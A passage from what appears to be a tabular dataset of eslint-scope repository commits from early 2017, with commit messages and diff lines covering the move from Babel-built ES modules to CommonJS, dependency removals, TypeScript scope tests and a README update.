6<c> sourceType: 'module'});<\n>-        expect(globalScope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('module');<\n>-        expect(scope.variables[0].name).to.be.equal('x');<\n>-        expect(scope.variables[0].defs[0].type).to.be.equal('ImportBinding');<\n>-    it('should import insided names#2'<c> function() {<\n>-        const ast = espree(`import {x as v} from ""mod"";`<c> {sourceType: 'module'});<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: 'module'});<\n>-        expect(globalScope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('module');<\n>-        expect(scope.variables[0].name).to.be.equal('v');<\n>-        expect(scope.variables[0].defs[0].type).to.be.equal('ImportBinding');<\n>-const expect = require('chai').expect;<\n>-const parse = require('../third_party/esprima').parse;<\n>-const analyze = require('..').analyze;<\n>-describe('ES6 iteration scope'<c> function() {<\n>-    it('let materialize iteration scope for ForInStatement#1'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-        expect(scope.variables[1].name).to.be.equal('i');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('i');<\n>-        expect(scope.type).to.be.equal('TDZ');<\n>-        expect(scope.variables[0].name).to.be.equal('i');<\n>-        expect(scope.variables[0].defs[0].type).to.be.equal('TDZ');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('i');<\n>-        expect(scope.type).to.be.equal('for');<\n>-        expect(scope.variables[0].name).to.be.equal('i');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('i');<\n>-        expect(scope.type).to.be.equal('block');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('console');<\n>-        expect(scope.references[1].identifier.name).to.be.equal('i');<\n>-    it('let materialize iteration scope for ForInStatement#2'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-        expect(scope.variables[1].name).to.be.equal('i');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('i');<\n>-        expect(scope.type).to.be.equal('TDZ');<\n>-        expect(scope.variables[0].name).to.be.equal('i');<\n>-        expect(scope.variables[0].defs[0].type).to.be.equal('TDZ');<\n>-        expect(scope.variables[1].name).to.be.equal('j');<\n>-        expect(scope.variables[1].defs[0].type).to.be.equal('TDZ');<\n>-        expect(scope.variables[2].name).to.be.equal('k');<\n>-        expect(scope.variables[2].defs[0].type).to.be.equal('TDZ');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('i');<\n>-        expect(scope.type).to.be.equal('for');<\n>-        expect(scope.variables[0].name).to.be.equal('i');<\n>-        expect(scope.variables[1].name).to.be.equal('j');<\n>-        expect(scope.variables[2].name).to.be.equal('k');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('i');<\n>-        expect(scope.references[1].identifier.name).to.be.equal('j');<\n>-        expect(scope.references[2].identifier.name).to.be.equal('k');<\n>-        expect(scope.type).to.be.equal('block');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('console');<\n>-        expect(scope.references[1].identifier.name).to.be.equal('i');<\n>-    it('let materialize iteration scope for ForStatement#2'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-        expect(scope.variables[1].name).to.be.equal('i');<\n>-        expect(scope.variables[2].name).to.be.equal('obj');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('i');<\n>-        expect(scope.references[1].identifier.name).to.be.equal('obj');<\n>-        expect(scope.type).to.be.equal('for');<\n>-        expect(scope.variables[0].name).to.be.equal('i');<\n>-        expect(scope.variables[0].defs[0].type).to.be.equal('Variable');<\n>-        expect(scope.variables[1].name).to.be.equal('j');<\n>-        expect(scope.variables[1].defs[0].type).to.be.equal('Variable');<\n>-        expect(scope.variables[2].name).to.be.equal('k');<\n>-        expect(scope.variables[2].defs[0].type).to.be.equal('Variable');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('i');<\n>-        expect(scope.references[1].identifier.name).to.be.equal('j');<\n>-        expect(scope.references[2].identifier.name).to.be.equal('k');<\n>-        expect(scope.references[3].identifier.name).to.be.equal('obj');<\n>-        expect(scope.references[4].identifier.name).to.be.equal('i');<\n>-        expect(scope.references[5].identifier.name).to.be.equal('okok');<\n>-        expect(scope.references[6].identifier.name).to.be.equal('i');<\n>-        expect(scope.type).to.be.equal('block');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('console');<\n>-        expect(scope.references[1].identifier.name).to.be.equal('i');<\n>-        expect(scope.references[2].identifier.name).to.be.equal('j');<\n>-        expect(scope.references[3].identifier.name).to.be.equal('k');<\n>-const expect = require('chai').expect;<\n>-const analyze = require('..').analyze;<\n>-const parse = require('../third_party/espree');<\n>-describe('ES6 new.target'<c> function() {<\n>-    it('should not make references of new.target'<c> function() {<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.block.type).to.be.equal('FunctionExpression');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-const expect = require('chai').expect;<\n>-const parse = require('../third_party/esprima').parse;<\n>-const analyze = require('..').analyze;<\n>-describe('ES6 object'<c> function() {<\n>-    it('method definition'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.block.type).to.be.equal('Program');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.block.type).to.be.equal('FunctionExpression');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-    it('computed property key may refer variables'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.block.type).to.be.equal('Program');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.block.type).to.be.equal('FunctionExpression');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-        expect(scope.variables[1].name).to.be.equal('yuyushiki');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('yuyushiki');<\n>-        expect(scope.references[1].identifier.name).to.be.equal('yuyushiki');<\n>-        expect(scope.references[2].identifier.name).to.be.equal('yuyushiki');<\n>-const expect = require('chai').expect;<\n>-const esprima = require('../third_party/esprima').parse;<\n>-const espree = require('../third_party/espree');<\n>-const analyze = require('..').analyze;<\n>-describe('ES6 rest arguments'<c> function() {<\n>-    it('materialize rest argument in scope (esprima: rest property of FunctionDeclaration)'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.block.type).to.be.equal('Program');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-        expect(scope.variables[1].name).to.be.equal('bar');<\n>-        expect(scope.variables[1].defs[0].name.name).to.be.equal('bar');<\n>-    it('materialize rest argument in scope (espree: RestElement)'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.block.type).to.be.equal('Program');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-        expect(scope.variables[1].name).to.be.equal('bar');<\n>-        expect(scope.variables[1].defs[0].name.name).to.be.equal('bar');<\n>-const expect = require('chai').expect;<\n>-const parse = require('../third_party/esprima').parse;<\n>-const analyze = require('..').analyze;<\n>-describe('ES6 super'<c> function() {<\n>-    it('is not handled as reference'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.variables[0].name).to.be.equal('Hello');<\n>-        expect(scope.type).to.be.equal('class');<\n>-        expect(scope.variables[0].name).to.be.equal('Hello');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(sc",F
17,56,56,569,4,26,Corbin Uselton,70,3,24,3,User,1,3149,Sat,13,4,11 Feb 2017,Chore: Remove es6-map and es6-weakmap as they are included in node4 (#10),0,0,3,4,132,,"-    ""es6-map"": ""^0.1.3""<c><\n>-    ""es6-weak-map"": ""^2.0.1""<c><\n>-const WeakMap = require('es6-weak-map');<\n>-const Map = require('es6-map');<\n>",F
17,56,56,569,4,26,Corbin Uselton,70,3,24,3,User,1,3149,Sat,12,37,11 Feb 2017,Chore: Convert to ES6 that is supported on Node 4 commonjs modules and remove Babel (#14),1,0,42,445,16337,"+    - ""4""<\n>+    - ""5""<\n>+    - ""6""<\n>+    - ""7""<\n>+sudo: false<\n>+script: ""npm test""<\n>+gulp.task('test'<c> function () {<\n>+gulp.task('patch'<c> function () { return inc('patch'); })<\n>+gulp.task('minor'<c> function () { return inc('minor'); })<\n>+gulp.task('major'<c> function () { return inc('major'); })<\n>+  ""main"": ""src/index.js""<c><\n>+    ""typescript"": ""~2.0.10""<c><\n>+""use strict"";<\n>+const Variable = require('./variable');<\n>+class Definition {<\n>+module.exports = {<\n>+""use strict"";<\n>+const assert = require('assert');<\n>+const ScopeManager = require('./scope-manager');<\n>+const Referencer = require('./referencer');<\n>+const Reference = require('./reference');<\n>+const Variable = require('./variable');<\n>+const Scope = require('./scope');<\n>+const version = require('../package.json').version;<\n>+function analyze(tree<c> providedOptions) {<\n>+module.exports = {<\n>+    ScopeManager<c><\n>+    analyze<\n>+""use strict"";<\n>+const Syntax = require('estraverse').Syntax;<\n>+const esrecurse = require('esrecurse');<\n>+class PatternVisitor extends esrecurse.Visitor {<\n>+module.exports = PatternVisitor;<\n>+""use strict"";<\n>+class Reference {<\n>+module.exports = Reference;<\n>+""use strict"";<\n>+const Syntax = require('estraverse').Syntax;<\n>+const esrecurse = require('esrecurse');<\n>+const Reference = require('./reference');<\n>+const Variable = require('./variable');<\n>+const PatternVisitor = require('./pattern-visitor');<\n>+const definition = require('./definition');<\n>+const assert = require('assert');<\n>+const ParameterDefinition = definition.ParameterDefinition;<\n>+const Definition = definition.Definition;<\n>+class Referencer extends esrecurse.Visitor {<\n>+module.exports = Referencer;<\n>+""use strict"";<\n>+const WeakMap = require('es6-weak-map');<\n>+const Scope = require('./scope');<\n>+const assert = require('assert');<\n>+const GlobalScope = Scope.GlobalScope;<\n>+const CatchScope = Scope.CatchScope;<\n>+const WithScope = Scope.WithScope;<\n>+const ModuleScope = Scope.ModuleScope;<\n>+const ClassScope = Scope.ClassScope;<\n>+const SwitchScope = Scope.SwitchScope;<\n>+const FunctionScope = Scope.FunctionScope;<\n>+const ForScope = Scope.ForScope;<\n>+const TDZScope = Scope.TDZScope;<\n>+const FunctionExpressionNameScope = Scope.FunctionExpressionNameScope;<\n>+const BlockScope = Scope.BlockScope;<\n>+class ScopeManager {<\n>+module.exports = ScopeManager;<\n>+""use strict"";<\n>+const Syntax = require('estraverse').Syntax;<\n>+const Map = require('es6-map');<\n>+const Reference = require('./reference');<\n>+const Variable = require('./variable');<\n>+const Definition = require('./definition').Definition;<\n>+const assert = require('assert');<\n>+class Scope {<\n>+class GlobalScope extends Scope {<\n>+class ModuleScope extends Scope {<\n>+class FunctionExpressionNameScope extends Scope {<\n>+class CatchScope extends Scope {<\n>+class WithScope extends Scope {<\n>+class TDZScope extends Scope {<\n>+class BlockScope extends Scope {<\n>+class SwitchScope extends Scope {<\n>+class FunctionScope extends Scope {<\n>+ class ForScope extends Scope {<\n>+class ClassScope extends Scope {<\n>+module.exports = {<\n>+    Scope<c><\n>+    GlobalScope<c><\n>+    ModuleScope<c><\n>+    FunctionExpressionNameScope<c><\n>+    CatchScope<c><\n>+    WithScope<c><\n>+    TDZScope<c><\n>+    BlockScope<c><\n>+    SwitchScope<c><\n>+    FunctionScope<c><\n>+    ForScope<c><\n>+    ClassScope<\n>+""use strict"";<\n>+class Variable {<\n>+module.exports = Variable;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const esprima = require('esprima');<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const esprima = require('esprima');<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const esprima = require('esprima');<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const parse = require('../third_party/esprima').parse;<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const parse = require('../third_party/esprima').parse;<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const parse = require('../third_party/esprima').parse;<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const parse = require('../third_party/esprima').parse;<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const espree = require('../third_party/espree');<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const harmony = require('../third_party/esprima');<\n>+const espree = require('../third_party/espree');<\n>+const analyze = require('..').analyze;<\n>+        expect(scope.implicit.left.map((left) => left.identifier.name)).to.deep.equal([<\n>+        expect(scope.implicit.left.map((left) => left.identifier.name)).to.deep.equal([<\n>+        expect(scope.implicit.left.map((left) => left.identifier.name)).to.deep.equal([<\n>+        expect(scope.implicit.left.map((left) => left.identifier.name)).to.deep.equal([<\n>+        expect(scope.implicit.left.map((left) => left.identifier.name)).to.deep.equal([<\n>+        expect(scope.implicit.left.map((left) => left.identifier.name)).to.deep.equal([<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const espree = require('../third_party/espree');<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const espree = require('../third_party/espree');<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const parse = require('../third_party/esprima').parse;<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const parse = require('../third_party/esprima').parse;<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const esprima = require('../third_party/esprima').parse;<\n>+const espree = require('../third_party/espree');<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const parse = require('../third_party/esprima').parse;<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const parse = require('../third_party/esprima').parse;<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const parse = require('../third_party/esprima').parse;<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const esprima = require('../third_party/esprima');<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const parse = require('../third_party/esprima').parse;<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const visit = require('esrecurse').visit;<\n>+const espree = require('../third_party/espree');<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const parse = require('../third_party/esprima').parse;<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const parse = require('../third_party/esprima').parse;<\n>+const analyze = require('..').analyze;<\n>+        const scopes = analyze(ast).scopes;<\n>+        const scopes = analyze(ast).scopes;<\n>+        const scopes = analyze(ast).scopes;<\n>+        const scopes = analyze(ast).scopes;<\n>+        const scopes = analyze(ast).scopes;<\n>+        const scopes = analyze(ast).scopes;<\n>+        const scopes = analyze(ast).scopes;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const parse = require('../third_party/esprima').parse;<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const parse = require('../third_party/esprima').parse;<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const parse = require('../third_party/esprima').parse;<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const analyze = require('..').analyze;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const parse = require('../third_party/esprima').parse;<\n>+const analyze = require('..').analyze;<\n>+        const scopes = analyze(ast<c> {optimistic: true}).scopes;<\n>+        const scopes = analyze(ast<c> {optimistic: true}).scopes;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const espree = require('../third_party/espree');<\n>+const analyze = require('..').analyze;<\n>+                const references = scope.variables[0].references;<\n>+""use strict"";<\n>+const expect = require('chai').expect;<\n>+const parse = require('../third_party/esprima').parse;<\n>+const analyze = require('..').analyze;<\n>","-  ""presets"": [""es2015""]<\n>-sudo: false<\n>-  - ""0.10""<\n>-  - ""0.11""<\n>-  - ""0.12""<\n>-  - ""iojs-1""<\n>-  - ""iojs-2""<\n>-  - ""iojs-3""<\n>-  - ""4""<\n>-matrix:<\n>-  allow_failures:<\n>-    - node_js:<\n>-      - ""0.11""<\n>-      - ""iojs-1""<\n>-      - ""iojs-2""<\n>-      - ""iojs-3""<\n>-    babel = require('gulp-babel')<c><\n>-require('babel-register')({<\n>-    only: /eslint-scope\/(src|test)\//<\n>-var BABEL_OPTIONS = JSON.parse(fs.readFileSync('.babelrc'<c> { encoding: 'utf8' }));<\n>-var build = lazypipe()<\n>-    .pipe(sourcemaps.init)<\n>-    .pipe(babel<c> BABEL_OPTIONS)<\n>-    .pipe(sourcemaps.write)<\n>-    .pipe(gulp.dest<c> 'lib');<\n>-gulp.task('build-for-watch'<c> function () {<\n>-    return gulp.src(SOURCE).pipe(plumber()).pipe(build());<\n>-gulp.task('build'<c> function () {<\n>-    return gulp.src(SOURCE).pipe(build());<\n>-gulp.task('test'<c> [ 'lint'<c> 'build' ]<c> function () {<\n>-gulp.task('watch'<c> [ 'build-for-watch' ]<c> function () {<\n>-    gulp.watch(SOURCE<c> [ 'build-for-watch' ]);<\n>-gulp.task('patch'<c> [ 'build' ]<c> function () { return inc('patch'); })<\n>-gulp.task('minor'<c> [ 'build' ]<c> function () { return inc('minor'); })<\n>-gulp.task('major'<c> [ 'build' ]<c> function () { return inc('major'); })<\n>-  ""main"": ""lib/index.js""<c><\n>-    ""babel"": ""^6.3.26""<c><\n>-    ""babel-preset-es2015"": ""^6.3.13""<c><\n>-    ""babel-register"": ""^6.3.13""<c><\n>-    ""gulp-babel"": ""^6.1.1""<c><\n>-import Variable from './variable';<\n>-export default class Definition {<\n>-export {<\n>-import assert from 'assert';<\n>-import ScopeManager from './scope-manager';<\n>-import Referencer from './referencer';<\n>-import Reference from './reference';<\n>-import Variable from './variable';<\n>-import Scope from './scope';<\n>-import { version } from '../package.json';<\n>-export function analyze(tree<c> providedOptions) {<\n>-export {<\n>-    ScopeManager<\n>-import { Syntax } from 'estraverse';<\n>-import esrecurse from 'esrecurse';<\n>-export default class PatternVisitor extends esrecurse.Visitor {<\n>-export default class Reference {<\n>-import { Syntax } from 'estraverse';<\n>-import esrecurse from 'esrecurse';<\n>-import Reference from './reference';<\n>-import Variable from './variable';<\n>-import PatternVisitor from './pattern-visitor';<\n>-import { ParameterDefinition<c> Definition } from './definition';<\n>-import assert from 'assert';<\n>-export default class Referencer extends esrecurse.Visitor {<\n>-import WeakMap from 'es6-weak-map';<\n>-import Scope from './scope';<\n>-import assert from 'assert';<\n>-import {<\n>-    GlobalScope<c><\n>-    CatchScope<c><\n>-    WithScope<c><\n>-    ModuleScope<c><\n>-    ClassScope<c><\n>-    SwitchScope<c><\n>-    FunctionScope<c><\n>-    ForScope<c><\n>-    TDZScope<c><\n>-    FunctionExpressionNameScope<c><\n>-    BlockScope<\n>-export default class ScopeManager {<\n>-import { Syntax } from 'estraverse';<\n>-import Map from 'es6-map';<\n>-import Reference from './reference';<\n>-import Variable from './variable';<\n>-import Definition from './definition';<\n>-import assert from 'assert';<\n>-export default class Scope {<\n>-export class GlobalScope extends Scope {<\n>-export class ModuleScope extends Scope {<\n>-export class FunctionExpressionNameScope extends Scope {<\n>-export class CatchScope extends Scope {<\n>-export class WithScope extends Scope {<\n>-export class TDZScope extends Scope {<\n>-export class BlockScope extends Scope {<\n>-export class SwitchScope extends Scope {<\n>-export class FunctionScope extends Scope {<\n>-export class ForScope extends Scope {<\n>-export class ClassScope extends Scope {<\n>-export default class Variable {<\n>-import { expect } from 'chai';<\n>-import esprima from 'esprima';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import esprima from 'esprima';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import esprima from 'esprima';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import { parse } from '../third_party/esprima';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import { parse } from '../third_party/esprima';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import { parse } from '../third_party/esprima';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import { parse } from '../third_party/esprima';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import espree from '../third_party/espree';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import harmony from '../third_party/esprima';<\n>-import espree from '../third_party/espree';<\n>-import { analyze } from '..';<\n>-        expect(scope.implicit.left.map(({ identifier }) => identifier.name)).to.deep.equal([<\n>-        expect(scope.implicit.left.map(({ identifier }) => identifier.name)).to.deep.equal([<\n>-        expect(scope.implicit.left.map(({ identifier }) => identifier.name)).to.deep.equal([<\n>-        expect(scope.implicit.left.map(({ identifier }) => identifier.name)).to.deep.equal([<\n>-        expect(scope.implicit.left.map(({ identifier }) => identifier.name)).to.deep.equal([<\n>-        expect(scope.implicit.left.map(({ identifier }) => identifier.name)).to.deep.equal([<\n>-import { expect } from 'chai';<\n>-import espree from '../third_party/espree';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import espree from '../third_party/espree';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import { parse } from '../third_party/esprima';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import { parse } from '../third_party/esprima';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import { parse as esprima } from '../third_party/esprima';<\n>-import espree from '../third_party/espree';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import { parse } from '../third_party/esprima';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import { parse } from '../third_party/esprima';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import { parse } from '../third_party/esprima';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import esprima from 'esprima';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import { parse as parse } from 'esprima';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import { visit } from 'esrecurse';<\n>-import espree from '../third_party/espree';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import { parse } from 'esprima';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import { analyze } from '..';<\n>-import { parse } from 'esprima';<\n>-        const { scopes } = analyze(ast);<\n>-        const { scopes } = analyze(ast);<\n>-        const { scopes } = analyze(ast);<\n>-        const { scopes } = analyze(ast);<\n>-        const { scopes } = analyze(ast);<\n>-        const { scopes } = analyze(ast);<\n>-        const { scopes } = analyze(ast);<\n>-import { expect } from 'chai';<\n>-import { parse } from '../third_party/esprima';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import { parse } from 'esprima';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import { parse } from '../third_party/esprima';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import { analyze } from '..';<\n>-import { expect } from 'chai';<\n>-import { analyze } from '..';<\n>-import { parse } from 'esprima';<\n>-        const { scopes } = analyze(ast<c> {optimistic: true});<\n>-        const { scopes } = analyze(ast<c> {optimistic: true});<\n>-import { expect } from 'chai';<\n>-import espree from '../third_party/espree';<\n>-import { analyze } from '..';<\n>-                const { references } = scope.variables[0];<\n>-require(""babel-register"");<\n>-import { expect } from 'chai';<\n>-import { parse } from 'esprima';<\n>-import { analyze } from '..';<\n>",F
17,56,56,569,4,26,Corbin Uselton,70,3,24,3,User,1,3149,Sat,10,38,11 Feb 2017,Update: Add check for node.body in referencer (#2) * Add check for node.body in referencer * Add comment explaining the node.body check * Allow tests to run with babel We will remove this soon but need to add tests for new features in the mean time. * Add typescript-eslint-parser as dev dependency This used in tests for typescript features. * Strict scope should be false when there is no body This fixes an issue with typescript having an empty body for some functions * Add tests for typescript scope analysis This includes a test for multiple call signatures. * Add check for node.body in referencer Add comment explaining the node.body check Allow tests to run with babel We will remove this soon but need to add tests for new features in the mean time. Add typescript-eslint-parser as dev dependency This used in tests for typescript features. Strict scope should be false when there is no body This fixes an issue with typescript having an empty body for some functions Add tests for typescript scope analysis This includes a test for multiple call signatures. Add comment explaining the node.body check Allow tests to run with babel We will remove this soon but need to add tests for new features in the mean time. Strict scope should be false when there is no body This fixes an issue with typescript having an empty body for some functions Add tests for typescript scope analysis This includes a test for multiple call signatures.,0,1,3,73,3400,"+    ""vinyl-source-stream"": ""^1.1.0""<c><\n>+    ""typescript-eslint-parser"": ""^1.0.0""<\n>+        // In TypeScript there are a number of function-like constructs which have no body<c><\n>+        // so check it exists before traversing<\n>+        if (node.body) {<\n>+            // Skip BlockStatement to prevent creating BlockStatement scope.<\n>+            if (node.body.type === Syntax.BlockStatement) {<\n>+                this.visitChildren(node.body);<\n>+            } else {<\n>+                this.visit(node.body);<\n>+            }<\n>+        if (!body) {<\n>+            return false;<\n>+        }<\n>+/**<\n>+ * @fileoverview Typescript scope tests<\n>+ * @author Reyad Attiyat<\n>+ */<\n>+""use strict"";<\n>+//------------------------------------------------------------------------------<\n>+// Requirements<\n>+//------------------------------------------------------------------------------<\n>+require(""babel-register"");<\n>+const expect = require('chai').expect<c><\n>+    parse = require('typescript-eslint-parser').parse<c><\n>+    analyze = require('../src').analyze;<\n>+//------------------------------------------------------------------------------<\n>+// Tests<\n>+//------------------------------------------------------------------------------<\n>+describe('typescript'<c> () => {<\n>+    describe('multiple call signatures'<c> () => {<\n>+        it('should create a function scope'<c> () => {<\n>+            const ast = parse(`<\n>+                function foo(bar: number): number;<\n>+                function foo(bar: string): string;<\n>+                function foo(bar: string | number): string | number {<\n>+                    return bar;<\n>+                }<\n>+            `);<\n>+            const scopeManager = analyze(ast);<\n>+            expect(scopeManager.scopes).to.have.length(4);<\n>+            const globalScope = scopeManager.scopes[0];<\n>+            expect(globalScope.type).to.be.equal('global');<\n>+            expect(globalScope.variables).to.have.length(1);<\n>+            expect(globalScope.references).to.have.length(0);<\n>+            expect(globalScope.isArgumentsMaterialized()).to.be.true;<\n>+            // Function scopes<\n>+            let scope = scopeManager.scopes[1];<\n>+            expect(scope.type).to.be.equal('function');<\n>+            expect(scope.variables).to.have.length(2);<\n>+            expect(scope.variables[0].name).to.be.equal('arguments');<\n>+            expect(scope.isArgumentsMaterialized()).to.be.false;<\n>+            expect(scope.references).to.have.length(0);<\n>+            scope = scopeManager.scopes[2];<\n>+            expect(scope.type).to.be.equal('function');<\n>+            expect(scope.variables).to.have.length(2);<\n>+            expect(scope.variables[0].name).to.be.equal('arguments');<\n>+            expect(scope.isArgumentsMaterialized()).to.be.false;<\n>+            expect(scope.references).to.have.length(0);<\n>+            scope = scopeManager.scopes[3];<\n>+            expect(scope.type).to.be.equal('function');<\n>+            expect(scope.variables).to.have.length(2);<\n>+            expect(scope.variables[0].name).to.be.equal('arguments');<\n>+            expect(scope.isArgumentsMaterialized()).to.be.false;<\n>+            expect(scope.references).to.have.length(1);<\n>+        });<\n>+    });<\n>","-    ""vinyl-source-stream"": ""^1.1.0""<\n>-        // Skip BlockStatement to prevent creating BlockStatement scope.<\n>-        if (node.body.type === Syntax.BlockStatement) {<\n>-            this.visitChildren(node.body);<\n>-        } else {<\n>-            this.visit(node.body);<\n>",F
17,56,56,569,4,26,Corbin Uselton,70,3,24,3,User,1,3149,Fri,5,8,10 Feb 2017,Remove browserify and jsdoc (#12),0,0,2,11,339,,"-    browserify = require('browserify')<c><\n>-gulp.task('browserify'<c> [ 'build' ]<c> function () {<\n>-    return browserify({<\n>-        entries: [ './lib/index.js' ]<\n>-    })<\n>-    .bundle()<\n>-    .pipe(source('bundle.js'))<\n>-    .pipe(gulp.dest('build'))<\n>-    ""jsdoc"": ""jsdoc src/*.js README.md""<c><\n>-    ""browserify"": ""^13.0.0""<c><\n>-    ""jsdoc"": ""^3.4.0""<c><\n>",F
17,56,56,569,4,26,James Henry,13,3,225,2,User,0,2955,Wed,17,31,18 Jan 2017,Chore: Update README.md (#3),0,0,2,52,3314,+# ESLint Scope<\n>+ESLint Scope is the [ECMAScript](http://www.ecma-international.org/publications/standards/Ecma-262.htm) scope analyzer used in ESLint. It is a fork of [escope](http://github.com/estools/escope).<\n>+## Usage<\n>+Install:<\n>+```<\n>+npm i eslint-scope --save<\n>+```<\n>+Example:<\n>+var eslintScope = require('eslint-scope');<\n>+var scopeManager = eslintScope.analyze(ast);<\n>+## Contributing<\n>+Issues and pull requests will be triaged and responded to as quickly as possible. We operate under the [ESLint Contributor Guidelines](http://eslint.org/docs/developer-guide/contributing)<c> so please be sure to read them before contributing. If you're not sure where to dig in<c> check out the [issues](https://github.com/eslint/eslint-scope/issues).<\n>+## Build Commands<\n>+* `npm test` - run all linting and tests<\n>+* `npm run lint` - run all linting<\n>+## License<\n>+ESLint Scope is licensed under a permissive BSD 2-clause license.<\n>+gulp.task('test'<c> [ 'lint'<c> 'build' ]<c> function () {<\n>,"-Escope 